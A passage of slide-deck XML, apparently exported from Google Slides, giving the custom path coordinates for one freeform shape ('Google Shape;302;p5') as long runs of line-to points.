                  <a:lnTo>
                    <a:pt x="16470" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16690" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16984" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17021" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15920" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15296" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15186" y="6639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15223" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15333" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15700" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16030" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16287" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16360" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16360" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16067" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14526" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="1724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="1027"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="961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2" name="Google Shape;302;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6855475" y="1544725"/>
              <a:ext cx="444800" cy="353100"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="17792" h="14124" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="10565" y="2275"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10785" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11189" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="3743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="3156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="2679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="2349"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="2275"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1285" y="2129"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1248" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="2239"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="2239"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="2936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="3046"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="2129"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11702" y="2715"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11959" y="2936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="3156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="3266"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="4183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="4770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="5100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="2936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11666" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="2715"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12326" y="3522"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12399" y="3596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="3596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="3963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="6127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="6384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="6384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="5467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="3522"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5100" y="8401"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4989" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="9245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="9465"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="9465"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="8401"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5210" y="9685"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5136" y="9722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="10639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="10749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="10749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="10639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="10272"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="9832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="9722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="9685"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14600" y="9501"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14563" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="10712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="10859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="10859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="10639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="9832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="9501"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12729" y="4183"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12986" y="4880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="4990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="5100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="6714"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="7301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="8218"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="8328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="8328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="5577"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12913" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="5210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13169" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13390" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="5797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13280" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="7081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="8915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="8805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="7411"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="6604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13390" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13463" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="6714"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13463" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12913" y="7081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="8548"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="9722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="10052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="10052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="9942"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="8695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="7411"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="7191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="7081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="7081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14197" y="7191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="8218"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="9245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="10639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="10749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="10969"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="10969"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="10419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="7741"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="7631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="8328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="9135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="9942"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="11446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="11336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="11336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="11556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="9171"/>
                  </a:lnTo>
